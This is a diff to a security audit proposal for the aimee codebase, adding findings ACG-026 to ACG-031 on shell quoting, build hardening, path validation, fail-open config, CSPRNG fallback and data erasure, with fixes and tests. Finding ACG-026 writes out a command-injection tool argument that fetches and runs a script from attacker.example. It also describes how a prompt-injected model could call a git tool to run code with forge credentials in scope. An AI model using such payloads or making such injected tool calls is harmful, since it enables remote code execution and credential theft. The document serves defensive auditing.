@@ -1,6 +1,9 @@
 # Proposal: Security, compliance, audibility, and governance assurance program
 
 - **State:** pending; source audit complete, remediation proposed
+- **Audit passes:** two independent passes over the same commit, merged into this single
+  record. ACG-001–ACG-025 are first-pass findings; ACG-026–ACG-031 are second-pass findings.
+  See [Audit passes and attribution](#audit-passes-and-attribution)
 - **Audit baseline:** `origin/testing` at
   `a01a71c495fdb10a28821b154242cb7d0eb1d271` (2026-08-26)
 - **Audit scope:** the tracked source tree, build and release automation, deployment artifacts,
@@ -92,8 +95,52 @@ providers. These require a deployment and organizational audit before any certif
   `index hybrid` fallback. Direct repository inspection is therefore the source-discovery method.
 - The audit branch was created directly from the current fetched `origin/testing`; the original
   feature checkout and its uncommitted files are excluded.
-- Findings will distinguish static evidence, executable test evidence, and live-deployment evidence.
+- Findings distinguish static evidence, executable test evidence, and live-deployment evidence.
   Source presence alone cannot establish operational effectiveness.
+- Surfaces the second pass did not review at line level, and does not claim clean: the event-bus
+  arena implementation; the Go workflow engine and control plane (`server-go`, ~29k lines) beyond
+  dependency posture; the browser and webchat CSRF and session surface; the KB management token and
+  JWKS verification path (partially covered by ACG-007); and the Windows and macOS platform
+  backends. The first pass covered several of these; where neither pass reached a surface, it is
+  named here rather than left implied.
+
+<a id="audit-passes-and-attribution"></a>
+## Audit passes and attribution
+
+This audit was performed as **two independent passes over the same commit**, run concurrently and
+without visibility into each other's findings until both sweeps had completed. They were kept
+attributable while in progress and are merged here into one record and one ledger.
+
+- **First pass — ACG-001 to ACG-025.** Entered through deployment and dependency surfaces: shipped
+  Compose topologies, workflow pinning, Go module versions, DB1 bootstrap, route and capability
+  inventory, tenant isolation, and the audit chain's own schema.
+- **Second pass — ACG-026 to ACG-031.** Entered through in-process enforcement primitives: the
+  shell-quoting helper, the path validator, the generated config-accessor layer, the CSPRNG, and
+  the retention and erasure surface.
+
+The two passes overlapped on four items and diverged on the rest. The divergence is informative
+rather than accidental: neither entry point sees the other's findings. The second pass produced the
+audit's **second Critical** (ACG-026), which the first pass did not reach; the first pass produced
+the KB authentication finding (ACG-001) and the dependency and release-integrity findings, which
+the second did not.
+
+The practical conclusion for the assurance programme: a single audit lens over a codebase of this
+size systematically misses whole classes of defect. Where the programme below commissions
+independent testing, it should commission **distinct lenses**, not a repeat of the same one.
+
+Four items were found by both passes. They are recorded once, under the first-pass ID, with the
+second pass's evidence folded in:
+
+| Overlapping item | Recorded as | Second-pass contribution |
+| --- | --- | --- |
+| WORM capture default-off | ACG-002 | Test-locked default, and the `aimee audit verify` false pass; see the addendum in ACG-002 |
+| SBOM, signing, provenance | ACG-004 | No separate finding filed |
+| Dependency scanning in CI | ACG-004 / ACG-005 | Only the sanitizer, SAST and secret-scanning half is filed separately, as ACG-027 |
+| Published guarantees vs shipped behaviour | ACG-025 | The *understatement* direction; see the addendum in ACG-025 |
+
+Two further pairs are distinct findings that share one root cause and must be remediated together
+rather than separately — ACG-013 with ACG-028 (path authorization), and ACG-006 with ACG-030
+(constant sentinel written on failure). Each pair is cross-referenced in both of its findings.
 
 ## Finding ledger
 
@@ -126,9 +173,15 @@ This table is updated as findings are verified. Candidate issues stay out of the
 | ACG-023 | Medium | Gateway identity | Gateway pairing codes are predictable/non-unique and pairing state updates are not atomic across processes | verified |
 | ACG-024 | Medium | Security testing | The checked-in nightly fuzz workflow is broken by a referenced but absent target source | verified by execution |
 | ACG-025 | Medium | Assurance claims | The published security model states guarantees that shipped defaults and reachable paths contradict | verified |
+| ACG-026 | Critical | Tool containment / injection | `shell_escape()` does not quote; ~20 unquoted call sites let a model-controlled MCP git path argument reach a shell on aimee-server, with forge credentials in scope | verified; release-blocking |
+| ACG-027 | High | Secure development | Binary hardening depends on toolchain defaults (no stack canaries, no fortified libc, partial RELRO only), and sanitizer, SAST and secret-scanning gates are absent | verified by execution |
+| ACG-028 | Medium | Filesystem authorization | `guardrails_validate_file_path` is a sensitive-path deny-list, not workspace confinement, and ignores its own bounds parameter | verified |
+| ACG-029 | Medium | Governance / policy resolution | Generated config accessors cannot distinguish "off" from "config authority unreachable"; security flags fail open | verified |
+| ACG-030 | Medium | Credential custody / accountability | CSPRNG failure fails open to a constant, colliding identifier on session, artifact, trigger and ingress paths | verified |
+| ACG-031 | Medium | Data protection, retention, deletion | No data-subject erasure and no content retention control, despite the security model instructing operators to configure one | verified |
 
-Current verified total: **1 critical, 10 high, 13 medium, and 1 low**. Severity can move only when
-new exploitability or compensating-control evidence is recorded in this document.
+Current verified total: **2 critical, 11 high, 17 medium, and 1 low — 31 findings**. Severity can
+move only when new exploitability or compensating-control evidence is recorded in this document.
 
 ### ACG-001 — Shipped KB topologies expose an authentication-off owner surface
 
@@ -185,6 +238,16 @@ new exploitability or compensating-control evidence is recorded in this document
 - **Acceptance evidence:** fault-inject full queues, unavailable storage, reload failure, disk full,
   and process crash at every decision/effect boundary; no effect may be reported complete without
   either its committed row or an explicit fail-closed/degraded result.
+
+- **Second-pass addendum.** Two evidence items, neither changing the severity.
+  `src/tests/test_db2_runtime_config_support.c:8` asserts `config_audit_worm_enabled() == 0` as the
+  expected default, so default-off is intentional and *test-locked*, not incidental — the
+  remediation must change a test, which is worth knowing before scheduling it. And the
+  operator-facing consequence deserves its own acceptance test: an operator following the Operator
+  checklist in `docs/SECURITY.md` runs `aimee audit verify`, receives a **pass on an empty chain**,
+  and reasonably concludes the tamper-evidence guarantee holds. Until the default flips,
+  `aimee audit verify` must exit non-zero with "chain disabled — nothing verified" rather than
+  succeeding.
 
 ### ACG-003 — The WORM chain does not bind chronology or full attribution
 
@@ -620,6 +683,472 @@ new exploitability or compensating-control evidence is recorded in this document
   guarantee to passing negative tests and an evidence artifact. A missing mapping, disabled default,
   contradictory configuration, or expired exception blocks publication and release.
 
+- **Second-pass addendum — the understatement direction.** ACG-025 catalogues where
+  `docs/SECURITY.md` claims *more* than the code delivers. The second pass found the opposite as
+  well, and a claim registry must capture both or it will institutionalise the understatement. The
+  trust-boundary table reads "delegate → host | **process or container** isolation, resource limits,
+  explicit mounts and egress"; both alternatives are stale.
+  `workspace_turn_bind_container` (`src/modules/workspace/workspace_turn.c:520-560`) has removed the
+  in-process path entirely — "There is no second execution model to fall back to, so every failure
+  below refuses (-1)" — and `delegate_sandbox_require_isolation` is documented in
+  `docs/gen/configuration.md:54` as a deprecated, ignored key. The shipped posture is
+  *unconditional container isolation with no host fallback*, materially stronger than the document
+  claims. An understated control is a lost assurance credit: a reviewer reading the current text
+  would score this boundary lower than the code earns. The registry schema should therefore record,
+  per claim, both `enforcement_owner` and `stronger_than_stated`, so drift is detected in either
+  direction by the same CI check.
+
+<a id="acg-026"></a>
+### ACG-026 — `shell_escape()` does not quote, and ~20 call sites interpolate it unquoted
+
+- **Control objective:** an untrusted tool argument must not reach a command interpreter, and a
+  model must not obtain execution inside the process that custodies credentials.
+
+- **Evidence.** `shell_escape()` (`src/util.c:956`) escapes `'` as `'\''` and returns the body
+  **without surrounding quotes**:
+
+  ```c
+  char *shell_escape(const char *raw)      /* src/util.c:956 */
+  {
+     ...
+     for (size_t i = 0; i < len; i++)
+        if (raw[i] == '\'') { esc[j++]='\''; esc[j++]='\\'; esc[j++]='\''; esc[j++]='\''; }
+        else                  esc[j++] = raw[i];
+     ...
+  }
+  ```
+
+  Its implicit contract is therefore *"safe only when the caller writes `'%s'`"*. That contract is
+  stated nowhere, and it is violated at roughly twenty interpolation sites. An input containing no
+  `'` — `` /tmp; id; # `` — passes through completely unchanged.
+
+  The reachable sink is the git MCP repository resolver:
+
+  ```c
+  static int mcp_git_candidate_root(const char *candidate, ...)  /* mcp_git_query.c:347 */
+  {
+     char *esc = shell_escape(candidate);
+     snprintf(git_cmd, sizeof(git_cmd),
+              "git -C %s rev-parse --show-toplevel 2>/dev/null", esc);   /* bare %s */
+     char *out = mcp_git_run(git_cmd, &rc);
+  }
+  ```
+
+  `candidate` is a **model-supplied MCP tool argument**: `args["path"]`, added as the first and
+  authoritative candidate at `src/modules/git/mcp_git_query.c:982`, with `args["cwd"]` as a second
+  path at `:1015`. `mcp_git_run()` executes through `run_cmd*` → `popen()` (`src/util.c:690`),
+  i.e. `/bin/sh -c`.
+
+- **Failure condition.** A model — including one steered by prompt injection carried in retrieved
+  text, a repository file, or an MCP tool result, all three of which `docs/SECURITY.md` declares
+  hostile — calls any aimee git MCP tool with:
+
+  ```json
+  {"path": "/tmp; curl -s https://attacker.example/x.sh | sh; #"}
+  ```
+
+  The resolver builds `git -C /tmp; curl -s https://attacker.example/x.sh | sh; # rev-parse
+  --show-toplevel` and hands it to `popen()`. Arbitrary code executes on aimee-server. No
+  operator misconfiguration is required; this is the default tool path.
+
+- **Impact.** Three multipliers make this Critical rather than High:
+
+  1. **The injected shell inherits a live forge credential.** `mcp_git_run()` deliberately runs
+     git on the server with `GH_TOKEN` and the `GIT_ASKPASS` shim injected into the child
+     environment (`mcp_git_query.c:100-121`, via `git_cred_inject_build_env_for_repo`). This
+     defeats the stated guarantee that "agent credentials are resolved inside the server and are
+     not returned to workflows or delegates" — the model never *receives* the credential, it
+     achieves execution in the process that holds it, which is strictly worse.
+  2. **It lands on the trusted side of the sandbox boundary.** The comment at
+     `mcp_git_query.c:69-81` documents that git tooling is routed to aimee-server *specifically*
+     to keep it out of the `--network none`, no-credential delegate sandbox. The injection
+     therefore executes exactly where the sandbox exists to prevent execution, with network
+     access.
+  3. **On the documented managed deployment it reaches host root.**
+     `compose.server-managed.yaml:208` bind-mounts `/var/run/docker.sock`, and
+     `deploy/container/server-entrypoint.sh:492-504` grants the `aimee` service user that
+     socket's group. `docs/SECURITY.md` accepts "anyone who controls that server can control the
+     Docker host" as a deployment trade-off — but that sentence assumes control of the server is
+     itself gated. ACG-026 removes the gate: one tool argument from a prompt-injected model
+     suffices. This also compounds ACG-001: an unauthenticated KB owner surface and a
+     model-reachable RCE on the server are reachable from different directions into the same
+     deployment.
+
+- **Other unquoted sites confirmed** (same helper, same shell backing):
+
+  | File | Lines | Format |
+  | --- | --- | --- |
+  | `src/modules/git/mcp_git_query.c` | 356, plus the `rev-parse` / `--git-common-dir` helpers | `git -C %s …` |
+  | `src/index.c` | 287, 295, 301, 488, 498, 506, 658, 703, 722 | `git -C %s …`, `find %s …` |
+  | `src/modules/db2/c/canonical_index.c` | 711, 719, 725, 892, 900, 906, 1033, 1072, 1087 | `git -C %s …`, `find %s …` |
+  | `src/util.c` | 715, 739 | `cd %s && %s` |
+  | `src/server/cli_session_pty.c` | 209 | `tmux attach -t %s` |
+
+- **Compensating controls and residual risk.** None on this path. Roughly 90 of the 110
+  `shell_escape` call sites *do* write `'%s'` and are correct — `git_forge_vault.c:96`,
+  `mcp_git_branch.c` throughout, `server_pipeline.c`. This is the shape of a latent trap rather
+  than an absence of care: the helper is right most of the time, which is precisely why the
+  exceptions survived review.
+
+- **Required change / owner.** Platform Security and Tooling:
+
+  1. **Required for the sink:** stop building shell strings for git.
+     `safe_exec_capture_cwd_env_timeout()` already exists in `src/util.c` and takes an `argv`
+     vector; route `mcp_git_run` and the `index.c` / `canonical_index.c` git calls through it, so
+     no shell is involved and no quoting contract can be violated.
+  2. For sites that must remain shell-backed, make `shell_escape()` emit a **fully quoted** token
+     — returning `'…'` including delimiters — and rename it `shell_quote()`, so every call site
+     is revisited by the compiler rather than by reviewer attention. Update the ~90 correct sites
+     to drop their now-doubled quotes in the same change.
+  3. Add a `shell-quote-check` target beside the existing `git-cred-centralized-check`, wired
+     into required CI.
+  4. Independently of quoting, validate `args["path"]` and `args["cwd"]` against the assigned
+     workspace root before use. `docs/SECURITY.md` claims "path checks use canonical workspace
+     roots"; this resolver performs no such check. The machinery already exists —
+     `workspace_turn_workspace_authorized` does exactly this correctly for the sandbox path.
+
+- **Acceptance tests.**
+  - `shell_quote("a'b;c")` round-trips through `/bin/sh -c` as the single literal argument
+    `a'b;c`.
+  - A git MCP tool called with `{"path": "/tmp; touch /tmp/aimee-injection-canary; #"}` leaves no
+    canary file and returns a refusal.
+  - `make -C src shell-quote-check` reports zero bare-`%s` interpolations of an escaped value.
+  - `mcp_git_candidate_root` refuses a `path` outside every registered workspace root.
+
+- **Rollout constraint.** Change 1 must not wait for change 2. The rename is the durable fix; the
+  sink is the live one, and it is release-blocking on its own.
+
+<a id="acg-027"></a>
+### ACG-027 — hardening depends on toolchain defaults, and broad sanitizer/SAST gates are absent
+
+- **Control objective:** exploitable memory-safety defects are detected before release, and those
+  that ship are made materially harder to exploit.
+
+- **Evidence (a) — hardening.** The single `C_FLAGS` line that builds all ~872k lines of
+  first-party C (`src/Makefile:110`):
+
+  ```make
+  C_FLAGS = -Os -flto -ffunction-sections -fdata-sections -Wl,--gc-sections -s \
+            -Wall -Wextra -Werror -Wno-unused-parameter -Wno-format-truncation \
+            -Wno-unused-result -MMD -MP …
+  ```
+
+  No checked-in release profile explicitly requires `-D_FORTIFY_SOURCE=3`,
+  `-fstack-protector-strong`, `-fstack-clash-protection`, `-fPIE -pie`, full RELRO
+  (`-Wl,-z,relro,-z,now`), `-Wl,-z,noexecstack`, `-Wformat-security`, or
+  `-fcf-protection`. A direct build on the audit host demonstrates why the distinction matters:
+  the host toolchain supplies PIE, a non-executable stack and partial RELRO by default, but the
+  resulting stripped `aimee-server` has no `BIND_NOW`, stack-canary or fortified-libc imports.
+  Another supported compiler/distribution can silently produce a weaker artifact because the
+  repository neither requests nor verifies these properties.
+
+  Two flags actively work against this audit:
+
+  - `-Wno-format-truncation` suppresses exactly the diagnostic class that matters given how much
+    of this codebase builds shell commands and paths with `snprintf` into fixed buffers. A
+    silently truncated quoted shell argument is a security-relevant failure — see ACG-026 — and
+    the compiler is being told not to mention it. `index.c:240` and `code_collect.c:240` show the
+    codebase *does* check truncation by hand where someone remembered to.
+  - `-s` strips symbols from shipped binaries, degrading the crash forensics that
+    `src/shutdown_forensics.c` exists to perform.
+
+- **Evidence (b) — detection.** The repository has a standalone witness-gate TSan Make target and
+  a second bus-arena TSan script, but neither appears in the required workflows. There is no broad
+  ASan/UBSan build of the native unit suite or fuzz targets. `src/Makefile` defines
+  `static-analysis`, `cppcheck` and `clang-tidy` targets; none appears in any of the 18 workflows.
+  `fuzz-nightly.yml` intends to run randomized inputs, which is useful when operational, but it
+  neither adds ASan/UBSan nor preserves nonzero target results (and ACG-024 shows the workflow
+  currently fails before the fuzz run). A secret scanner is also absent on every PR.
+
+- **Impact.** ~872k lines of C parse hostile input without a repository-enforced stack-canary,
+  full-RELRO or fortified-libc contract and without a broad memory-error detector in the required
+  test or fuzz pipeline. The resulting exploit resistance varies with the build host, and many
+  memory-safety defects can escape the present gates. Note the
+  asymmetry with the product's own promise: `docs/SECURITY.md` states "the OSV gate checks known
+  vulnerabilities and can block an unhealthy package" for *MCP packages the user installs*.
+
+- **Scope note.** The dependency-scanning and artifact-provenance halves of the CI gap are
+  **deferred to ACG-004 and ACG-005** and are not re-filed here. This finding covers binary
+  hardening, sanitizers, SAST and secret scanning only.
+
+- **Required change / owner.** Build & Release:
+
+  1. Add a hardened release profile: `-D_FORTIFY_SOURCE=3 -fstack-protector-strong
+     -fstack-clash-protection -fPIE -pie -Wl,-z,relro,-z,now -Wl,-z,noexecstack
+     -Wformat-security -fcf-protection=full`. Measure the size delta against the `-Os` goal.
+  2. Remove `-Wno-format-truncation` and fix the resulting sites; where truncation is genuinely
+     intended, say so with an explicit length check as `index.c:240` already does.
+  3. Ship debug symbols as a separate artifact rather than `-s`.
+  4. Add a required CI job running the existing unit-test shards under
+     `-fsanitize=address,undefined`, and build the fuzz targets with sanitizers. This is the
+     highest-yield item in this finding.
+  5. Wire `static-analysis` / `cppcheck` / `clang-tidy` into the `lint` job.
+  6. Add a secret scanner on every PR.
+
+- **Acceptance tests.**
+  - `checksec` on the shipped `aimee-server` reports RELRO=full, PIE, stack canaries, NX and
+    fortified functions present.
+  - A required CI job named `sanitizers` runs the unit-test shards green under ASan+UBSan.
+  - `make -C src fuzz` builds with `-fsanitize=address,undefined,fuzzer`.
+  - A PR containing a test credential fails CI.
+
+<a id="acg-028"></a>
+### ACG-028 — `guardrails_validate_file_path` is a deny-list, not workspace confinement, and ignores its own bounds parameter
+
+- **Control objective:** a tool write cannot escape the assigned workspace authority, and a
+  validation helper's signature does not misrepresent what it enforces.
+
+- **Cross-reference.** ACG-013 (`skill.show` cross-workspace reads) is a *reachable exploit* of
+  this same class, found independently by the primary pass on the read side. This finding is the
+  *shared helper* on the write side. They should be remediated under one invariant — resolve
+  beneath an authorized root with no symlink following, using directory FDs and
+  `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` — rather than patched separately. That two
+  independent passes each found a distinct instance is the strongest available evidence that the
+  path-authorization layer needs one owner and one primitive, not per-call-site fixes.
+
+- **Evidence.** `docs/SECURITY.md` states: "Path checks use canonical workspace roots. A symlink,
+  `..`, alternate spelling, or client-local path must not escape the assigned authority."
+
+  `guardrails_validate_file_path` (`src/modules/guardrails/guardrails.c:619`) — the function
+  thirteen tool implementations call to validate a path — does not check workspace roots at all.
+  It rejects literal `..` spellings, `realpath`s the input, and tests the result against a
+  **substring deny-list** of sensitive paths. A path that resolves anywhere on the host outside
+  that list passes. Three specific defects:
+
+  1. **The bounds parameter is a lie.** The signature is
+     `(const char *path, char *resolved_buf, size_t resolved_len)`, and `resolved_len` is **never
+     referenced in the body**. `realpath(path, resolved_buf)` writes up to `PATH_MAX`. Today every
+     caller passes `char resolved[MAX_PATH_LEN]` and `MAX_PATH_LEN == 4096 == PATH_MAX` on Linux,
+     so nothing overflows — but the function accepts a size it does not honour. The first caller
+     to pass a smaller buffer, or the first port to a platform where `PATH_MAX > MAX_PATH_LEN`,
+     gets a stack overflow with no diagnostic. This interacts directly with ACG-027: without
+     `-fstack-protector-strong`, that overflow is unmitigated.
+  2. **For a file that does not yet exist, the final path component is dropped from the check.**
+     When `realpath` fails, the function truncates to the parent directory, resolves *that* into
+     `resolved_buf`, and deny-list-checks the parent string. A deny-list entry naming a filename
+     rather than a directory therefore does not apply to creating that file.
+  3. **The trailing comment claims a check that is not made.** Lines 654-656 read "Check for
+     symlink escape: resolved path should not point into a sensitive directory even if the
+     original path looked benign. Compare against the same deny list (already done above on the
+     resolved path)." A deny-list on the resolved path is not a symlink-escape check; escape
+     *from the workspace root* is not tested anywhere in this function.
+
+- **Compensating controls and residual risk.** Real workspace confinement lives elsewhere and is
+  stronger. `agent_tools_session_isolation_blocks` (`src/server/agent_tools.c:219`) normalises the
+  path, requires it under a managed worktree, defaults to 1, and re-defaults to 1 on config-read
+  failure. `classify_path` (`guardrails.c:451`) does check the basename and is called from
+  `guardrails_orchestrator.c:1742`, covering tools routed through `pre_tool_check`. Tools calling
+  `guardrails_validate_file_path` directly are not covered by defect 2. Residual risk is therefore
+  defence-in-depth erosion rather than a demonstrated escape — but the weaker of two layers is
+  exactly where defence in depth is decided.
+
+- **Required change / owner.** Tooling & Guardrails:
+  1. Honour `resolved_len`: resolve into a local `PATH_MAX` buffer, bounds-check the copy out, and
+     return an error on overflow.
+  2. Deny-list the basename as well as the resolved parent on the not-yet-exists path, or have
+     this function call `classify_path` so there is one sensitivity decision rather than two.
+  3. Either add a workspace-root containment test here, or rename the function to
+     `guardrails_check_sensitive_path` and correct the trailing comment, so no future caller
+     mistakes it for the confinement boundary.
+
+- **Acceptance tests.**
+  - A caller passing a 256-byte `resolved_buf` with a 3000-byte resolved path receives an error,
+    not a smash.
+  - Creating a non-existent `.env` in a permitted directory is denied by the same code path that
+    denies overwriting an existing one.
+
+<a id="acg-029"></a>
+### ACG-029 — generated config accessors cannot distinguish "off" from "config authority unreachable"
+
+- **Control objective:** a security control's failure mode is its safe state, and one setting has
+  one default.
+
+- **Evidence.** Every generated boolean accessor across
+  `src/config_client_accessors_0.c` … `_7.c` (~380 of them) has this shape:
+
+  ```c
+  int config_require_session_worktree(void)      /* config_client_accessors_3.c:54 */
+  {
+     double value = 0;
+     (void)config_client_read_number("require_session_worktree", &value);
+     return (int)value;
+  }
+  ```
+
+  The read's return value is discarded. "Explicitly false", "never set", and "the config authority
+  is down / the transport failed" are indistinguishable, and all resolve to the permissive value
+  for a flag whose safe state is on.
+
+- **Failure condition.** This is established as live rather than theoretical by the codebase
+  itself. `src/server/agent_tools.c:223-228` bypasses the generated accessor specifically to avoid
+  it, with a comment naming the failure exactly:
+
+  > Fail closed if the independently running config authority is unavailable. Its generated
+  > convenience accessor returns zero for both explicit false and transport failure, which would
+  > silently disable isolation.
+
+  The session-isolation control was rescued by hand at one call site. The generator that produced
+  the trap was not changed, and ~380 accessors still carry it — among them
+  `config_integrity_enabled` (the anti-injection gate), `config_cross_verify` and
+  `config_roundtable_replay_verify_enabled`. As a direct consequence the two accessors for
+  `require_session_worktree` now disagree by construction: the generated one defaults to 0, while
+  the client-side attention guard (`src/cli_attention_guard.c:572`) defaults to 1.
+
+- **Impact.** A transient config-authority outage silently downgrades enforcement posture across
+  an unknown subset of controls, with no diagnostic and no audit record of the downgrade. This is
+  the same class of defect as ACG-002 and ACG-006: a failure that is indistinguishable from a
+  normal, permissive result.
+
+- **Required change / owner.** Config & Governance:
+  1. Change the generator to emit a failure-aware form — `int config_x(int default_on_failure)`,
+     or a paired `config_x_read(int *out)` returning a status — and make security-relevant flags
+     pass their safe default explicitly.
+  2. Until then, add a `config-failopen-check` target enumerating the security-relevant keys and
+     asserting each is read through a fail-closed call site rather than the generated convenience
+     accessor.
+  3. Delete the divergent `config_require_session_worktree` / `config_set_require_session_worktree`
+     pair, or point it at the fail-closed reader, so one setting does not have two accessors with
+     opposite defaults.
+
+- **Acceptance tests.**
+  - With the config authority stopped, `agent_tools_session_isolation_blocks` and
+    `config_integrity_enabled` both report their *safe* state, not their zero state.
+  - `make -C src config-failopen-check` passes, and fails on a reintroduced permissive read.
+
+<a id="acg-030"></a>
+### ACG-030 — CSPRNG failure fails open to a constant, colliding identifier
+
+- **Control objective:** identifiers that key session isolation, artifact custody and audit
+  attribution are unique, and randomness failure is never silently absorbed.
+
+- **Cross-reference.** ACG-006 records a zero-valued sentinel written into an audit *hash* field
+  on key failure. This finding is the same anti-pattern in a different subsystem: a zero-valued
+  sentinel written into an *identifier* on entropy failure. They should be remediated under one
+  rule — **no security-relevant field may be filled with a constant on failure** — and tested
+  together.
+
+- **Evidence.** The CSPRNG is `fopen("/dev/urandom")` + `fread`
+  (`src/posix/platform_random.c:5`):
+
+  ```c
+  int platform_random_bytes(void *buf, size_t len)
+  {
+     FILE *f = fopen("/dev/urandom", "r");
+     if (!f) return -1;
+     size_t n = fread(buf, 1, len, f);
+     fclose(f);
+     return (n == len) ? 0 : -1;
+  }
+  ```
+
+  Failure is not exotic. `fopen` fails under file-descriptor exhaustion (`EMFILE`/`ENFILE`) — a
+  state a busy server reaches — and in any container built with a minimal `/dev`, which is
+  precisely the direction the delegate sandbox posture pushes. `getrandom(2)` would avoid both.
+
+  Failure handling splits three ways across the 13 call sites:
+
+  | Behaviour on CSPRNG failure | Sites |
+  | --- | --- |
+  | `return -1` (correct) | `oauth_pkce.c:87`, `kb_oidc_login.c:107`, `kb/enroll.c:33`, `git_oauth_github.c:135`, `workspace.c:406`, `cli_mcp_serve.c:314` |
+  | `memset(raw, 0, …)` — emit a **constant** id | `session_id.c:45`, `server_auth.c:303`, `ingress_preinject.c:56`, `db2/c/artifacts.c:29` |
+  | Seed an LCG from `time()`/`pid` — emit a **predictable** id | `cli_launch.c:84`, `cmd_agent_delegate.c:75`, `server_trigger.c:37` |
+
+- **Impact.** The zeroing branch is worse than random: it does not merely weaken the identifier, it
+  makes **every** identifier generated under the failure identical
+  (`00000000-0000-0000-0000-000000000000`). Session ids key session state, branch ownership and
+  audit attribution; artifact ids key stored artifacts. A total collapse of the id space means
+  concurrent sessions silently share state and the audit trail attributes their actions to one
+  another — a direct hit on the `docs/SECURITY.md` claim that "audit records keep the originating
+  principal when work crosses a delegate, workflow, KB, or tool boundary."
+
+- **Required change / owner.** Runtime & Audit:
+  1. Reimplement `platform_random_bytes` on `getrandom(2)`, retaining `/dev/urandom` only as a
+     fallback for kernels lacking it, removing the descriptor dependency.
+  2. Make identifier generation fail closed as token generation already does. A session that
+     cannot obtain a unique id must not proceed under a shared one.
+  3. Delete the LCG fallbacks. A predictable identifier is not a graceful degradation.
+
+- **Acceptance tests.**
+  - With `platform_random_bytes` forced to fail, session, artifact, trigger and ingress id
+    generation each return an error; none returns a constant or a `time()`-derived value.
+  - `platform_random_bytes` succeeds with all file descriptors exhausted.
+  - The shared rule with ACG-006 is asserted: no security-relevant field is populated with a
+    constant on failure.
+
+<a id="acg-031"></a>
+### ACG-031 — no data-subject erasure, and no content retention control
+
+- **Control objective:** durable personal data has a bounded lifetime, a documented classification,
+  and can be deleted on request with an audit record of what was deleted.
+
+- **Evidence.** `docs/SECURITY.md` instructs operators: "Memory and document ingestion can retain
+  sensitive source text. Scope the KB, **configure retention**, and avoid sending restricted
+  evidence to an external synthesis provider."
+
+  There is no retention control to configure. A search of `docs/gen/configuration.md` for
+  retention/TTL keys returns `learning_proposal_ttl_days`,
+  `memory_typed_facts_speculative_ttl_days`, `kb.purge_fence_ttl_s`, `AIMEE_KB_CACHE_TTL_S` and
+  `AIMEE_WORKFLOW_LEASE_TTL_SECS` — TTLs on speculative facts, proposals, a purge fence, a cache
+  and a lease. None of them bounds how long ingested document text, memory content, conversation
+  history or audit rows are kept. The only `--retention-days` flag in the CLI is on `aimee index`
+  (`src/cmd_index.c:204`) and governs code-index lifecycle, not content.
+
+  Separately, there is **no per-principal erasure operation**. Purge is scoped to a project
+  (`aimee index purge`, `db2_kb_service_clear_current_project`), not to a data subject. DB2 holds
+  memories, documents, conversation history and audit rows keyed by principal; a request to erase
+  one person's data cannot be executed with the tools that exist.
+
+- **Impact.** For a product whose premise is durable cross-session memory of a user's work, this is
+  the gap most likely to be raised first in any privacy review, and it blocks the primary audit's
+  own completion gate: *"Every durable data category has documented classification, scope,
+  retention, deletion, backup, restore, and audit behavior."*
+
+- **Design notes that belong in the decision, not the backlog.**
+  - **Erasure and WORM are in genuine tension.** An append-only hash-chained store cannot delete a
+    row without breaking the chain. The standard resolution is crypto-shredding: store erasable
+    content under a per-subject key, keep the chain over ciphertext and hashes, and erase by
+    destroying the key. This must be decided **before** ACG-002 makes the chain default-on, not
+    discovered afterwards.
+  - **At-rest encryption is undocumented outside the vault.** `docs/STORAGE_TIERS.md` and
+    `docs/DEPLOYMENT.md` contain no encryption guidance. The vault has real custody options
+    (TPM 2, PKCS#11, KMS); DB1, DB2 and the audit log have none stated, so an operator cannot tell
+    whether at-rest protection is expected from them or from the platform. This compounds ACG-008.
+
+- **Required change / owner.** Data & Privacy:
+  1. Add content retention policy: per-class maximum age (document text, memory content,
+     conversation history, audit rows) with a scheduled reaper and an audited deletion record.
+     Until it exists, remove "configure retention" from `docs/SECURITY.md` — the document must not
+     instruct an operator to use a control that is absent.
+  2. Add `aimee kb erase-subject <principal>` spanning memories, documents, history and derived
+     vectors, emitting an audited, itemised completion record.
+  3. Decide and document the erasure/WORM resolution, sequenced before ACG-002's remediation.
+  4. State the at-rest expectation for DB1, DB2 and the audit log in `docs/STORAGE_TIERS.md`, even
+     if the answer is "provide it at the volume layer."
+
+- **Acceptance tests.**
+  - `aimee kb erase-subject` removes a principal's rows across every store and leaves a verifiable
+    audit record of what was removed.
+  - After the retention age elapses, a reaper deletes the corresponding content and records the
+    deletion.
+  - `aimee audit verify` still verifies across an erasure boundary.
+
+## Cross-cutting observation
+
+Five findings — ACG-002, ACG-006, ACG-026, ACG-029 and ACG-030, drawn from both passes — share one
+shape, and naming it predicts where the next finding will be: **a correct control with a permissive
+failure mode, applied inconsistently across call sites.**
+
+`shell_escape` is right at 90 of 110 sites. The CSPRNG is right on every token path and wrong on
+every identifier path. The generated config accessor was fixed by hand at the one call site someone
+audited, and left unfixed at ~380 others. The audit hash writes a sentinel that looks like a hash.
+The WORM gate defaults to the permissive state. In every case the exception is invisible at the call
+site — the defective code *looks* like the correct code, which is why review did not catch it and
+why the same review will not catch the next one.
+
+That is an argument for mechanical enforcement over reviewer attention, which is why the
+remediations above propose `*-check` targets rather than guidelines. The repository's ~90 existing
+checks show this is already the house style; these are the places the style was not applied.
+
 ## Control assessment
 
 Ratings describe the source baseline, including its shipped defaults. `Deficient` means a verified
@@ -628,14 +1157,15 @@ gap prevents the stated objective; it does not mean no useful control exists.
 | Domain | Rating | Effective controls and evidence | Material gaps |
 | --- | --- | --- | --- |
 | Security architecture and trust boundaries | Partial | Split client/server/KB processes, generated route inventory, binary link-boundary checks, documented hostile inputs | KB auth-off owner mode; optional direct module egress; managed topology grants Docker host control |
-| Identity, authentication, and authorization | Deficient | Central server route-to-capability mapping, bearer enrollment, signed-write tiers, TLS/mTLS and certificate-pinning support | ACG-001, ACG-011, ACG-012, ACG-013, ACG-017 |
-| Tool, delegate, workspace, and egress containment | Partial | Delegate containers can be networkless and resource-bounded; degraded sandbox fallback is refused; server tool policy exists | Unsigned instruction artifacts, incomplete ingress integrity, direct egress, skill root escape |
-| Credential custody and cryptography | Partial | Vault ingestion scrubs bootstrap environment, hardened custody providers exist, secret fingerprints replace raw values in several logs, TLS 1.2 minimum is enforced where TLS is enabled | Auth-free KB path, weak DB1 secret, optional plaintext service links, audit hash coverage/key failure, no complete cryptographic agility or key-lifecycle evidence |
-| Data protection, privacy, retention, and deletion | Deficient | Tenant-aware tables, export/delete functions, configurable redaction, encrypted secret custody | Read isolation is not default-on; global audit views; no authoritative data/purpose/retention/deletion/hold matrix or deletion verification |
